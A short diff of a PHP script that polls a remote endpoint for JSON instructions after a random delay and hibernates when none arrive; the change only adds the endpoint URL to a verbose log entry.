@@ -46,7 +46,7 @@ sleep(rand(1, 30));
 
 // get instructions
 $instructions = @json_decode(file_get_contents($endpoint . 'instructions'));
-verboseLog(['instructions' => $instructions]);
+verboseLog(['endpoint' => $endpoint . 'instructions', 'instructions' => $instructions]);
 if (!$instructions) {
     file_put_contents($hibernateFilename, time() + 120);
     die();
